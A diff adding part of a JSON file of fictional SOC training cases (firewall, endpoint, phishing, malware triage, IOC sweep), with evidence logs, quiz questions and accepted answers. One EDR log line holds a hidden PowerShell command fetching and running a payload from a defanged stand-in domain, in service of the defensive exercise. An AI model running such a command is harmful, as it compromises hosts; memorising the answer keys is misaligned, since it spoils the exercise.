@@ -1,0 +1,406 @@
+[
+{
+ "id":9,"title":"Firewall Investigation","domain":"Network","tier":"Tier 1",
+ "theory":{
+  "concept":"Firewall logs record allow and deny decisions per session, plus the rule that made the decision. Analysts use them for three things: proving whether an attempted connection actually succeeded, finding permissive legacy rules nobody owns, and confirming or dismissing volume-based alerts. A DENY is evidence the control worked; an ALLOW on a path that should not exist is a finding in itself.",
+  "why":"Blocking is the fastest containment lever a SOC has, but blocking the wrong flow can stop payroll or replication. You must be certain which rule and which traffic you are touching.",
+  "look":["Rules with no owner, no ticket and a creation date years old","ALLOW decisions on inbound management protocols (445, 3389, 22) from the internet","Large sustained transfers to external addresses outside backup windows","Deny bursts across sequential ports (scanning) versus deny bursts on one port (misconfigured client)"],
+  "fp":["Backup replication, SaaS sync and video conferencing generate enormous, entirely legitimate volumes","A newly deployed application will trip volume rules until the baseline updates"],
+  "tips":["Always check the change calendar and the destination's business relationship before calling a transfer exfiltration.","Record the rule name in your report - remediation is owned by the network team and they need the rule ID."]
+ },
+ "case":{"id":"SOC-2026-00544","severity":"HIGH","alert":"Large outbound data transfer to external address outside business hours","host":"SRV-FILE02","time":"2026-03-01 02:00 UTC","source":"Perimeter firewall","brief":"A volume-threshold rule fired on the finance file server: 412 GB outbound to an external address overnight. The overnight analyst flagged it as possible exfiltration. Validate or dismiss that assessment, and review the perimeter ruleset while you are in there."},
+ "mitre":"N/A - benign replication (control validation)",
+ "evidence":[
+  {"name":"Firewall Session Log","rows":[
+   "2026-03-01 02:00:14 SRV-FILE02:49022 -> 198.18.44.9:443 TCP ALLOW rule=FW-BACKUP-07 bytes_out=412.6GB bytes_in=1.1GB dur=6812s app=tls sni=dr-replica.northwind-dr.net",
+   "2026-03-01 02:00:14 SRV-FILE02 TLS cert CN=dr-replica.northwind-dr.net issuer=\"DigiCert TLS RSA SHA256\" valid=true",
+   "2026-02-22 02:00:09 SRV-FILE02:49001 -> 198.18.44.9:443 TCP ALLOW rule=FW-BACKUP-07 bytes_out=398.2GB dur=6640s",
+   "2026-02-15 02:00:11 SRV-FILE02:48922 -> 198.18.44.9:443 TCP ALLOW rule=FW-BACKUP-07 bytes_out=401.9GB dur=6701s",
+   "2026-03-04 02:15:39 203.0.113.55:53122 -> DC-01:445 TCP ALLOW rule=FW-LEGACY-11 bytes_out=18KB bytes_in=44KB",
+   "2026-03-04 07:44:31 198.51.100.22:40522 -> SRV-LNX-04:22 TCP ALLOW rule=FW-MGMT-03 bytes_out=6KB bytes_in=22KB",
+   "2026-03-04 09:00:13 SRV-LNX-04:44377 -> 91.203.5.12:8443 TCP ALLOW rule=FW-EGRESS-ANY bytes_out=639 bytes_in=302",
+   "2026-03-04 03:11:02 45.33.32.156:61022 -> SRV-WEB01:3389 TCP DENY rule=FW-DEFAULT-DENY",
+   "2026-03-04 03:11:03 45.33.32.156:61024 -> SRV-WEB01:22 TCP DENY rule=FW-DEFAULT-DENY"
+  ]},
+  {"name":"Ruleset Extract","rows":[
+   "FW-BACKUP-07 src=SRV-FILE02 dst=198.18.44.9 port=443 action=ALLOW owner=Infrastructure ticket=CHG-1188 review=2026-06-01 note=\"Nightly DR replication to contracted DR provider\"",
+   "FW-LEGACY-11 src=ANY dst=DC-01 port=445 action=ALLOW owner=- ticket=- created=2021-04-02 review=- note=\"temp for migration\"",
+   "FW-MGMT-03 src=ANY dst=SRV-LNX-04 port=22 action=ALLOW owner=AppOps ticket=CHG-2210 note=\"vendor support access\"",
+   "FW-EGRESS-ANY src=INTERNAL dst=ANY port=ANY action=ALLOW owner=Network note=\"default permissive egress\"",
+   "Contract register: northwind-dr.net = contracted disaster-recovery provider since 2022, replication window 02:00-04:00 daily"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Which rule permitted the 412 GB transfer?","type":"exact","accept":["fw-backup-07","backup-07"],"hint":"The rule field on the flagged session."},
+  {"id":"q2","label":"Is the 412 GB transfer malicious exfiltration? (yes/no)","type":"exact","accept":["no"],"hint":"Check the destination against the contract register and compare with previous weeks."},
+  {"id":"q3","label":"What evidence proves the transfer is routine?","type":"keywords","accept":["previous","weeks","recurring","similar volume","every","baseline","contract","dr provider","valid cert","history"],"hint":"Two earlier sessions in the log look almost identical."},
+  {"id":"q4","label":"Which rule in the extract is the most dangerous misconfiguration?","type":"exact","accept":["fw-legacy-11","legacy-11"],"hint":"Look for an inbound ALLOW from ANY to a Tier-0 asset, with no owner and no ticket."},
+  {"id":"q5","label":"Which rule allowed the SSH compromise of SRV-LNX-04?","type":"exact","accept":["fw-mgmt-03","mgmt-03"],"hint":"Match the 07:44:31 session to its rule."},
+  {"id":"q6","label":"Which rule allowed the C2 beaconing to leave the estate?","type":"exact","accept":["fw-egress-any","egress-any"],"hint":"Look at the rule on the 09:00:13 outbound session."},
+  {"id":"q7","label":"Did the perimeter block the RDP attempt against SRV-WEB01? (yes/no)","type":"exact","accept":["yes"],"hint":"Read the action field on the 03:11 sessions."}
+ ],
+ "decision":"false_positive","severity_answer":"INFORMATIONAL",
+ "recommend":{"any":["close","remove","restrict","tighten","egress","rule review","decommission","tune"],"text":"Close the exfiltration alert as a False Positive against CHG-1188, and raise remediation to remove FW-LEGACY-11, scope FW-MGMT-03 to vendor source addresses, and replace FW-EGRESS-ANY with a filtered egress policy."},
+ "timelineKey":["02:00:14","02:15:39","07:44:31"],
+ "hints":["Volume alone is never evidence of exfiltration. Ask three questions: does the destination have a business relationship, does the traffic repeat on a schedule, and does the rule that allowed it have an owner.","The genuinely alarming findings in this case are not in the alert you were given - they are in the ruleset extract."],
+ "review":"The 412 GB transfer is contracted DR replication: same destination, same rule, same 02:00 window, comparable volume on 22 and 15 February, valid certificate for a domain in the contract register. It closes as a False Positive - but the case is not a waste of time, because the ruleset review is where the value is. FW-LEGACY-11 is an ownerless 2021 'temporary' rule allowing SMB from the entire internet to a domain controller, and it is how the svc_backup compromise reached DC-01. FW-MGMT-03 allowed the SSH intrusion, and the permissive FW-EGRESS-ANY is why C2 traffic leaves unchallenged. Findings from a False Positive investigation still go in the report.",
+ "next":"WKS-2041 began resolving the C2 domain at 08:31, an hour after the Linux host. That workstation belongs to k.rahman in Logistics. Pull the endpoint telemetry and find out how it got infected."
+},
+{
+ "id":10,"title":"Endpoint Investigation","domain":"Endpoint","tier":"Tier 1",
+ "theory":{
+  "concept":"An EDR agent records process creation, file writes, registry changes, module loads and network connections, linked into a process tree. Endpoint investigation means reconstructing that tree: what ran, what started it, what it wrote to disk, and what it contacted. The parent chain is usually the whole story.",
+  "why":"The endpoint is where user, file, process and network evidence intersect. It is the only place you can see initial access and execution in the same view.",
+  "look":["Execution from user-writable paths: %TEMP%, %APPDATA%, C:\\Users\\Public, %PROGRAMDATA%","Office applications or browsers as parents of script interpreters or cmd.exe","Binaries with mismatched or missing digital signatures, or names imitating system files (svch0st.exe, rundll32 copies)","File writes immediately followed by execution of the same file","Unsigned processes making outbound TLS connections to raw IPs"],
+  "fp":["Installers legitimately drop and execute from %TEMP%","Developer tooling spawns interpreters constantly - check the user and the host role"],
+  "tips":["Note the exact file path and hash; they become IOCs for the estate-wide sweep.","Attackers name payloads after real Windows components. Verify the path, not the name."]
+ },
+ "case":{"id":"SOC-2026-00551","severity":"HIGH","alert":"EDR: unsigned binary executed from user temp directory with outbound connection","host":"WKS-2041","time":"2026-03-04 08:29 UTC","source":"NW-EDR","brief":"WKS-2041 (user k.rahman, Logistics) started resolving known C2 infrastructure at 08:31. Reconstruct the process tree, identify the initial execution, and extract indicators for an estate sweep."},
+ "mitre":"T1204.002 - User Execution: Malicious File",
+ "evidence":[
+  {"name":"EDR Process Timeline - WKS-2041","rows":[
+   "08:27:52 proc=OUTLOOK.EXE pid=4120 user=k.rahman signer=\"Microsoft Corporation\" action=file_write path=C:\\Users\\k.rahman\\AppData\\Local\\Temp\\Shipping_Manifest_Mar04.zip",
+   "08:28:40 proc=explorer.exe pid=1884 user=k.rahman action=file_write path=C:\\Users\\k.rahman\\AppData\\Local\\Temp\\Shipping_Manifest_Mar04\\manifest.pdf.lnk",
+   "08:29:03 proc=explorer.exe pid=1884 child=cmd.exe pid=6612 cmd=\"cmd.exe /c start /min powershell -w hidden -c \\\"iwr hxxp://cdn-sync-delivery[.]net/mf.dat -OutFile $env:TEMP\\svchost32.exe; start $env:TEMP\\svchost32.exe\\\"\"",
+   "08:29:05 proc=powershell.exe pid=6640 parent=cmd.exe signer=\"Microsoft Corporation\" action=network_connect dest=91.203.5.12:80",
+   "08:29:07 proc=powershell.exe pid=6640 action=file_write path=C:\\Users\\k.rahman\\AppData\\Local\\Temp\\svchost32.exe sha256=b17d4f9a2c6e8811d0aa45cb3e7f2091cc48de6b7a10f3c92e5b4d8a6f1c0e73",
+   "08:29:09 proc=svchost32.exe pid=6702 parent=powershell.exe signer=NONE path=C:\\Users\\k.rahman\\AppData\\Local\\Temp\\svchost32.exe",
+   "08:29:12 proc=svchost32.exe pid=6702 action=registry_write key=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run value=WinUpdateSvc data=\"%TEMP%\\svchost32.exe\"",
+   "08:31:04 proc=svchost32.exe pid=6702 action=dns_query domain=cdn-sync-delivery.net",
+   "08:31:05 proc=svchost32.exe pid=6702 action=network_connect dest=91.203.5.12:8443",
+   "08:33:44 proc=svchost.exe pid=980 user=SYSTEM signer=\"Microsoft Corporation\" path=C:\\Windows\\System32\\svchost.exe action=service_start name=wuauserv",
+   "08:41:05 proc=svchost32.exe pid=6702 action=network_connect dest=91.203.5.12:8443",
+   "08:51:06 proc=svchost32.exe pid=6702 action=network_connect dest=91.203.5.12:8443"
+  ]},
+  {"name":"File and Signature Detail","rows":[
+   "C:\\Users\\k.rahman\\AppData\\Local\\Temp\\svchost32.exe signer=NONE size=284KB compiled=2026-02-26 packer=UPX",
+   "C:\\Windows\\System32\\svchost.exe signer=\"Microsoft Corporation\" valid=true (legitimate Windows service host)",
+   "TI lookup b17d4f9a... -> 41/72 detections, family: STORMPETREL loader, first submitted 2026-02-27",
+   "Shipping_Manifest_Mar04.zip received via email from logistics-partner@nw-freight-portal.net at 08:27, no prior correspondence"
+  ]},
+  {"name":"Host Context","rows":[
+   "WKS-2041 user=k.rahman dept=Logistics local_admin=no EDR=active last_patch=2026-02-28",
+   "k.rahman also authenticates to SRV-FILE02 finance shares (cross-department access granted 2025, never reviewed)"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Full path of the malicious binary","type":"keywords","accept":["svchost32.exe"],"hint":"One process has signer=NONE and runs from a user-writable directory."},
+  {"id":"q2","label":"SHA256 of the malicious binary (first 8 characters are enough)","type":"keywords","accept":["b17d4f9a"],"hint":"Read the hash on the file_write event that created it."},
+  {"id":"q3","label":"Which process wrote the binary to disk?","type":"exact","accept":["powershell.exe","powershell"],"hint":"Follow the file_write action at 08:29:07."},
+  {"id":"q4","label":"What was the initial access vector?","type":"choice","options":["Malicious email attachment opened by the user","Exploited public web service","Stolen VPN credentials","USB device"],"accept":["malicious email attachment opened by the user"],"hint":"Look at the very first event in the timeline and the file detail panel."},
+  {"id":"q5","label":"Registry key used for persistence (the hive and key path)","type":"keywords","accept":["run","currentversion\\run","hkcu"],"hint":"One event is a registry_write - read where it points."},
+  {"id":"q6","label":"Is the 08:33:44 svchost.exe (pid 980) activity malicious? (yes/no)","type":"exact","accept":["no"],"hint":"Compare its path and signer with the other process of a similar name."},
+  {"id":"q7","label":"Which malware family does threat intel attribute the hash to?","type":"exact","accept":["stormpetrel"],"hint":"Read the TI lookup line."},
+  {"id":"q8","label":"How many minutes elapsed between attachment delivery and first C2 contact?","type":"num","accept":["3","4"],"hint":"Compare the 08:27:52 write with the 08:31:05 connection."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["isolate","contain","quarantine","block","reset","reimage","disable"],"text":"Isolate WKS-2041 via EDR, quarantine svchost32.exe, block the hash estate-wide, reset k.rahman's credentials, and review her cross-department access to SRV-FILE02."},
+ "timelineKey":["08:27:52","08:29:03","08:29:09","08:31:05"],
+ "hints":["Two processes in this timeline have almost the same name. One lives in System32 and is signed by Microsoft; the other does not. That difference is the entire case.","Work backwards from the C2 connection: which process made it, what created that process, and what created that.","Read the very first line: an attachment arrives, a shortcut file appears, and a command interpreter runs. That is the initial access chain."],
+ "review":"The chain is: Outlook writes a ZIP attachment at 08:27:52, the user extracts it and executes manifest.pdf.lnk (a shortcut disguised as a PDF), which launches cmd.exe and hidden PowerShell, which downloads mf.dat from cdn-sync-delivery[.]net and saves it as svchost32.exe in %TEMP%, executes it, and the payload writes an HKCU Run key for persistence before beaconing to 91.203.5.12:8443 on a ten-minute cadence. The name svchost32.exe is deliberate camouflage - the genuine svchost.exe at 08:33:44 is signed, runs from System32 as SYSTEM, and is unrelated. Total time from delivery to C2: roughly three minutes. The sender domain nw-freight-portal[.]net has no prior correspondence history, which leads directly to your next case.",
+ "next":"The attachment came from a domain that imitates a Northwind freight partner. Mail security has now surfaced twelve similar messages delivered to Logistics and Finance. Investigate the phishing campaign before more users click."
+},
+{
+ "id":11,"title":"Phishing Investigation","domain":"Email Security","tier":"Tier 1",
+ "theory":{
+  "concept":"Email investigation works from the headers outward. The Return-Path and the authentication results (SPF, DKIM, DMARC) establish whether the message really came from the domain it claims. The Received chain shows the actual path. The body and its links show intent. Display names are free text and prove nothing.",
+  "why":"Phishing remains the most common initial access vector. Scoping a campaign quickly - who received it, who clicked, who submitted credentials - decides whether it stays one incident or becomes twelve.",
+  "look":["Look-alike domains: character substitution, extra hyphens, plausible new TLDs","SPF/DKIM/DMARC failures, especially DMARC fail with a mismatched Return-Path","Received hops through unrelated infrastructure","Attachment types that execute: .lnk, .iso, .img, .html, macro-enabled Office documents, password-protected archives that bypass scanning","Urgency, authority and secrecy in the body text"],
+  "fp":["Legitimate bulk mail and marketing platforms routinely fail DKIM alignment when misconfigured","Forwarded internal mail breaks SPF by design - check whether the forwarding host is your own"],
+  "tips":["Scope by sender domain, subject and attachment hash, then by who actually clicked.","Password-protected archives with the password in the email body exist to defeat content scanning."]
+ },
+ "case":{"id":"SOC-2026-00563","severity":"HIGH","alert":"Mail gateway: 12 messages from newly registered look-alike domain delivered to inboxes","host":"Mail Gateway MX-01","time":"2026-03-04 08:20 UTC","source":"Mail gateway / message trace","brief":"Determine whether the messages are phishing, identify the delivery mechanism, scope how many recipients interacted, and decide the containment action for the campaign."},
+ "mitre":"T1566.001 - Spearphishing Attachment",
+ "evidence":[
+  {"name":"Message Headers (sample)","rows":[
+   "From: \"Northwind Freight Portal\" <logistics-partner@nw-freight-portal.net>",
+   "Return-Path: bounce@mail-relay-77.dyn-fastns.net",
+   "To: k.rahman@northwind-lg.com",
+   "Subject: Updated shipping manifest - action required before 09:00",
+   "Date: 2026-03-04 08:20:11 UTC",
+   "Received: from mail-relay-77.dyn-fastns.net (91.203.5.44) by MX-01.northwind-lg.com",
+   "Authentication-Results: spf=fail (sender IP not permitted) dkim=none dmarc=fail (p=quarantine, policy not applied - domain not in enforcement list)",
+   "Attachment: Shipping_Manifest_Mar04.zip (password: manifest2026) sha256=e04a11cc7b9d3f2a55c10e8b46d7f3a29b0c55ed7a1f4b8c0d3e6a9f2b7c4d11",
+   "Archive contents: manifest.pdf.lnk (2 KB) - Windows shortcut, target: cmd.exe /c start /min powershell ...",
+   "Body: 'Our portal migration requires you to confirm the attached manifest before 09:00 today or your consignments will be held. Password: manifest2026'"
+  ]},
+  {"name":"Campaign Scope (message trace)","rows":[
+   "12 messages delivered 08:19-08:24 to: k.rahman, j.almeida, m.chen, s.dsouza, a.novak, t.baig (Logistics) and 6 Finance recipients",
+   "Opened: 9 | Attachment extracted: 3 (k.rahman, m.chen, a.novak) | .lnk executed: 2 (k.rahman, m.chen)",
+   "Reported to SOC by user: 1 (j.almeida, 08:38) - correct action",
+   "Blocked before delivery: 4 additional messages, same sender domain, to addresses not in the directory"
+  ]},
+  {"name":"Domain Enrichment","rows":[
+   "nw-freight-portal.net created=2026-02-24 registrar privacy-protected nameservers=ns1/ns2.dyn-fastns.net MX=mail-relay-77.dyn-fastns.net",
+   "cdn-sync-delivery.net created=2026-02-24 nameservers=ns1/ns2.dyn-fastns.net",
+   "datasync-77x.net created=2026-02-24 nameservers=ns1/ns2.dyn-fastns.net",
+   "Legitimate partner domain on record: northwind-freight.com (in use since 2019, DMARC p=reject)",
+   "91.203.5.44 and 91.203.5.12 -> same /24, ASN 64502"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Malicious sender domain","type":"exact","accept":["nw-freight-portal.net"],"hint":"Compare the From domain with the legitimate partner domain in enrichment."},
+  {"id":"q2","label":"Which three authentication checks are in the header, and what was the SPF result?","type":"keywords","accept":["fail","spf fail","failed"],"hint":"Read the Authentication-Results line."},
+  {"id":"q3","label":"File type inside the archive that actually executes","type":"keywords","accept":[".lnk","lnk","shortcut"],"hint":"Read the archive contents line - the extension before .lnk is decoration."},
+  {"id":"q4","label":"Why did the attacker password-protect the archive?","type":"keywords","accept":["scan","scanning","gateway","av","antivirus","inspect","detect","bypass","evade"],"hint":"Consider what a mail gateway cannot do to an encrypted archive."},
+  {"id":"q5","label":"How many recipients executed the .lnk file?","type":"num","accept":["2"],"hint":"Read the campaign scope line for .lnk executed."},
+  {"id":"q6","label":"Which users executed it?","type":"keywords","accept":["k.rahman","m.chen","rahman","chen"],"hint":"The same line names them."},
+  {"id":"q7","label":"What links this domain to the C2 infrastructure from earlier cases?","type":"keywords","accept":["nameserver","dyn-fastns","same registration","2026-02-24","same date","asn","91.203.5"],"hint":"Compare registration date, nameservers and IP range across all three domains."},
+  {"id":"q8","label":"Which user took the correct action and should be recognised?","type":"exact","accept":["j.almeida","almeida"],"hint":"One recipient reported the message to the SOC."}
+ ],
+ "decision":"true_positive","severity_answer":"HIGH",
+ "recommend":{"any":["purge","remove","block","quarantine","reset","awareness","isolate","recall"],"text":"Purge all 12 messages from mailboxes, block the sender domain and the dyn-fastns nameserver infrastructure, isolate m.chen's endpoint alongside WKS-2041, reset both users' credentials, and issue a targeted awareness notice."},
+ "timelineKey":["08:19","08:20:11","08:38"],
+ "hints":["The display name says one thing, the Return-Path says another, and the authentication results settle the argument. Read them in that order.","Scope before you remediate. The trace tells you exactly how many people opened, extracted and executed - and one of those users has not yet appeared in any of your investigations."],
+ "review":"This is a targeted campaign, not opportunistic spam: the sender domain imitates a real Northwind partner, was registered on the same day and on the same nameserver infrastructure as the C2 and tunnelling domains, and the message uses a deadline to force action. SPF failed and DMARC would have quarantined it had the domain been in the enforcement list - that gap is a finding. The payload is a .lnk inside a password-protected ZIP, a combination chosen specifically to defeat gateway scanning. Two users executed it: k.rahman (already known) and m.chen in Finance - which explains how the intrusion reached the finance file server. j.almeida reported it correctly and that behaviour should be reinforced publicly.",
+ "next":"m.chen's endpoint is now in scope and a sample of the payload has been recovered from WKS-2041. The malware lab has returned static analysis results. Extract what the binary tells you about itself."
+},
+{
+ "id":12,"title":"Malware Indicators","domain":"Malware Analysis","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"Static triage examines a sample without running it: hashes for identification, imports for capability, strings for infrastructure and behaviour, packing and entropy for evasion, compile timestamp and certificate for provenance. Dynamic triage runs it in a sandbox and records what it actually does. A Tier-1 analyst is not expected to reverse engineer, but is expected to read a triage report and pull indicators out of it.",
+  "why":"The report converts one infected machine into detection content for the whole estate.",
+  "look":["Imports that reveal capability: CreateRemoteThread and VirtualAllocEx for injection, CryptEncrypt for ransomware, InternetOpenUrl for download","High entropy sections and a packer such as UPX","Strings containing URLs, IPs, mutex names, user-agents and file paths","Compile timestamp close to first-seen date (freshly built) or absurdly old (faked)","Mutex creation - a unique mutex is an excellent, very cheap detection"],
+  "fp":["Packers are used by plenty of commercial software","Sandbox reports flag benign behaviour like reading the registry; judge the combination, not one line"],
+  "tips":["Turn every extracted artefact into a hunt query: hash, mutex, user-agent, domain, file path.","A hardcoded user-agent string is often the most durable indicator in the whole sample."]
+ },
+ "case":{"id":"SOC-2026-00571","severity":"HIGH","alert":"Malware triage report returned for recovered sample svchost32.exe","host":"Lab (detonation) / WKS-2041 origin","time":"2026-03-04 11:20 UTC","source":"Malware lab","brief":"Read the triage report and extract every usable indicator. Your output feeds the detection engineering backlog and the estate-wide sweep."},
+ "mitre":"T1027 - Obfuscated Files / T1055 - Process Injection",
+ "evidence":[
+  {"name":"Static Analysis","rows":[
+   "file=svchost32.exe sha256=b17d4f9a2c6e8811d0aa45cb3e7f2091cc48de6b7a10f3c92e5b4d8a6f1c0e73 md5=3f9c11ab77d0e5428cc1b6f0a2e4d735 size=284416",
+   "compile_timestamp=2026-02-26T19:44:02Z packer=UPX entropy=7.81 sections=UPX0,UPX1,.rsrc signature=none",
+   "imports: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, InternetOpenUrlA, InternetReadFile, RegSetValueExA, CreateMutexA, GetAdaptersInfo",
+   "strings: \"cdn-sync-delivery.net\" \"/gate.php\" \"Mozilla/5.0 (Windows NT 10.0; NorthSync/2.1)\" \"Global\\\\NWSYNC_9F21\" \"%TEMP%\\\\svchost32.exe\" \"WinUpdateSvc\"",
+   "resource: embedded PNG icon copied from legitimate Windows Update binary"
+  ]},
+  {"name":"Sandbox Behaviour","rows":[
+   "creates mutex Global\\NWSYNC_9F21 (single-instance check)",
+   "writes HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinUpdateSvc = %TEMP%\\svchost32.exe",
+   "resolves cdn-sync-delivery.net, connects 91.203.5.12:8443 every 600s +/- 12s jitter, POST /gate.php",
+   "injects into explorer.exe via CreateRemoteThread after 4 minutes",
+   "enumerates: hostname, domain, username, adapter addresses, installed AV product",
+   "no file encryption, no destructive behaviour observed in 20-minute run"
+  ]},
+  {"name":"Threat Intel Correlation","rows":[
+   "b17d4f9a... -> 41/72 engines, family STORMPETREL loader, first submitted 2026-02-27",
+   "Global\\NWSYNC_9F21 -> not previously documented publicly (campaign-specific)",
+   "User-agent NorthSync/2.1 -> observed in 3 prior incidents attributed to TA-4411, all logistics sector"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Mutex name created by the sample","type":"keywords","accept":["nwsync_9f21","global\\nwsync_9f21","nwsync"],"hint":"Look for a CreateMutexA-related string and the sandbox behaviour line."},
+  {"id":"q2","label":"Hardcoded C2 URI path","type":"keywords","accept":["/gate.php","gate.php"],"hint":"One of the strings is a path, not a domain."},
+  {"id":"q3","label":"Hardcoded user-agent identifier","type":"keywords","accept":["northsync","northsync/2.1"],"hint":"The user-agent string contains a non-standard product token."},
+  {"id":"q4","label":"Which imports indicate process injection capability?","type":"keywords","accept":["createremotethread","writeprocessmemory","virtualallocex","remote thread"],"hint":"Three imports in sequence form the classic injection triple."},
+  {"id":"q5","label":"Which process does the sample inject into?","type":"exact","accept":["explorer.exe","explorer"],"hint":"Read the injection line in sandbox behaviour."},
+  {"id":"q6","label":"Beacon interval in seconds","type":"num","accept":["600"],"hint":"Sandbox behaviour states the interval and its jitter."},
+  {"id":"q7","label":"What packer is used?","type":"exact","accept":["upx"],"hint":"Check the section names and the packer field."},
+  {"id":"q8","label":"Which indicator would make the most durable detection rule, and why?","type":"keywords","accept":["mutex","user-agent","useragent","nwsync","northsync"],"hint":"Hashes change with every rebuild. Which artefacts are baked into the operator's tooling instead?"}
+ ],
+ "decision":"true_positive","severity_answer":"HIGH",
+ "recommend":{"any":["detection","rule","sweep","hunt","block","ioc","sigma","yara","distribute"],"text":"Publish the IOC set (hash, domain, URI path, user-agent, mutex, Run key name) to EDR and SIEM, sweep the estate for the mutex and user-agent, and open a detection-engineering ticket."},
+ "timelineKey":[],
+ "hints":["Read the strings section as a list of things the author had to hardcode. Each one is a detection opportunity.","Ask which indicators survive a recompile. The file hash does not; the mutex name, the URI path and the user-agent usually do."],
+ "review":"STORMPETREL is a loader: it establishes persistence via an HKCU Run value named WinUpdateSvc, ensures a single instance with the mutex Global\\NWSYNC_9F21, beacons POST /gate.php to cdn-sync-delivery[.]net every 600 seconds with 12 seconds of jitter, injects into explorer.exe to survive process termination, and profiles the host including which AV is installed. The injection triple (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread) confirms capability that static naming alone would not. Crucially it does not encrypt anything - this is an access tool, meaning a human operator is expected to follow. The campaign-specific mutex and the NorthSync/2.1 user-agent are the highest-value detections because they survive recompilation; the SHA256 will not.",
+ "next":"You now hold a full indicator set. The next task is to pivot on those indicators across every data source you have touched so far, and find hosts nobody has flagged yet."
+},
+{
+ "id":13,"title":"IOC Investigation","domain":"Threat Detection","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"An indicator of compromise is any observable that ties an environment to known malicious activity: hashes, IPs, domains, URLs, registry values, mutexes, file paths, user-agents, certificate fingerprints. Pivoting is the discipline of taking one confirmed indicator, searching every data source for it, and using each new hit to generate the next search.",
+  "why":"Pivoting is how scoping happens. Without it you contain the machines you already knew about and leave the rest infected.",
+  "look":["The same indicator appearing in a data source nobody has checked yet","Hosts matching a behavioural indicator (mutex, Run key, user-agent) even where the file hash differs","Time gaps: a host that beaconed once a week ago and stopped is still compromised","Indicators appearing on assets outside the originally scoped department"],
+  "fp":["Shared infrastructure - a CDN IP may host both malicious and legitimate content, so IP-only matching over-scopes","Security tooling and researchers inside your estate may legitimately touch malicious domains"],
+  "tips":["Record indicator confidence: a campaign-specific mutex is high confidence, a shared hosting IP is low.","Every pivot needs a written source and timestamp; your scoping list becomes the containment list."]
+ },
+ "case":{"id":"SOC-2026-00584","severity":"CRITICAL","alert":"Estate-wide indicator sweep for STORMPETREL artefacts","host":"Estate","time":"2026-03-04 12:00 UTC","source":"EDR / SIEM / proxy / DNS","brief":"Run the indicator set across every available data source and produce the definitive list of compromised hosts. One host in the results is a false match - identify it."},
+ "mitre":"T1518 - Software Discovery (defensive sweep)",
+ "evidence":[
+  {"name":"Indicator Set","rows":[
+   "HASH b17d4f9a2c6e8811... (svchost32.exe, STORMPETREL loader)",
+   "DOMAIN cdn-sync-delivery.net | datasync-77x.net | nw-freight-portal.net",
+   "IP 91.203.5.12 | 91.203.5.44 | 203.0.113.55 | 198.51.100.22",
+   "MUTEX Global\\NWSYNC_9F21 | USER-AGENT NorthSync/2.1 | URI /gate.php",
+   "REGISTRY HKCU\\...\\Run\\WinUpdateSvc | PATH %TEMP%\\svchost32.exe | LINUX /tmp/.sysupd"
+  ]},
+  {"name":"Sweep Results","rows":[
+   "WKS-2041 hash=MATCH mutex=MATCH runkey=MATCH ua=MATCH dns=MATCH  (known)",
+   "SRV-LNX-04 file=/tmp/.sysupd MATCH cron=MATCH dns=MATCH  (known)",
+   "SRV-FILE02 hash=NO mutex=MATCH runkey=NO ua=MATCH dns=MATCH(datasync-77x.net) proc=nwsync.exe path=C:\\ProgramData\\nwsync.exe sha256=d92e77b3...  (NEW)",
+   "WKS-2077 hash=NO mutex=NO runkey=NO ua=NO dns=MATCH(cdn-sync-delivery.net, 1 query 09:51)  (NEW)",
+   "SOC-ANALYST-VM01 dns=MATCH(cdn-sync-delivery.net, 14 queries) hash=MATCH(sample stored in lab share) mutex=NO ua=NO  (NEW)",
+   "WKS-2019 proxy=MATCH? user-agent contains 'NorthSync' in a single request to northsync-analytics.com  (NEW)"
+  ]},
+  {"name":"Context for Sweep Hits","rows":[
+   "SRV-FILE02: m.chen mapped drive; nwsync.exe present since 09:44; 1902 TXT queries to datasync-77x.net at 10:02",
+   "WKS-2077: user a.novak; single DNS query at 09:51 from chrome.exe after clicking a link in a reported phishing email; no execution, no beacon follow-up",
+   "SOC-ANALYST-VM01: SOC-owned detonation VM, asset tier 3, sample analysed here at 11:20 by the malware lab",
+   "WKS-2019: northsync-analytics.com is a marketing analytics SaaS used by Northwind Sales since 2024; unrelated product name collision"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"How many hosts are genuinely compromised?","type":"num","accept":["3"],"hint":"Count hosts with execution or persistence evidence, not hosts that merely touched a domain."},
+  {"id":"q2","label":"Name the newly discovered compromised host","type":"exact","accept":["srv-file02","file02"],"hint":"One new host has a matching mutex, a matching user-agent and an unexplained binary in ProgramData."},
+  {"id":"q3","label":"Path of the second-stage binary on that host","type":"keywords","accept":["c:\\programdata\\nwsync.exe","programdata\\nwsync.exe","nwsync.exe"],"hint":"Read the proc/path fields on that sweep row."},
+  {"id":"q4","label":"Why did the hash indicator fail to detect it?","type":"keywords","accept":["different hash","recompil","new build","changed","variant","different binary","rebuilt","polymorph"],"hint":"Compare the two SHA256 values and recall what you concluded about hash durability."},
+  {"id":"q5","label":"Which sweep hit is a SOC-owned system that should be excluded?","type":"exact","accept":["soc-analyst-vm01","analyst-vm01","vm01"],"hint":"Check the asset context for each new hit."},
+  {"id":"q6","label":"Which sweep hit is a false match caused by a name collision?","type":"exact","accept":["wks-2019","2019"],"hint":"One host matched a user-agent substring against an unrelated SaaS domain."},
+  {"id":"q7","label":"Is WKS-2077 compromised? (yes/no)","type":"exact","accept":["no"],"hint":"A DNS resolution alone is exposure, not execution. Check for persistence or beaconing."},
+  {"id":"q8","label":"Which indicator type detected the new compromise that the hash missed?","type":"keywords","accept":["mutex","user-agent","useragent","behavioural","behavioral"],"hint":"Two behavioural indicators matched on SRV-FILE02 while file-based ones did not."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["isolate","contain","scope","escalate","quarantine","preserve"],"text":"Confirm scope as WKS-2041, SRV-LNX-04 and SRV-FILE02; isolate SRV-FILE02 and preserve memory; exclude the SOC lab VM and the WKS-2019 name collision from scope; monitor WKS-2077 as exposed-not-compromised."},
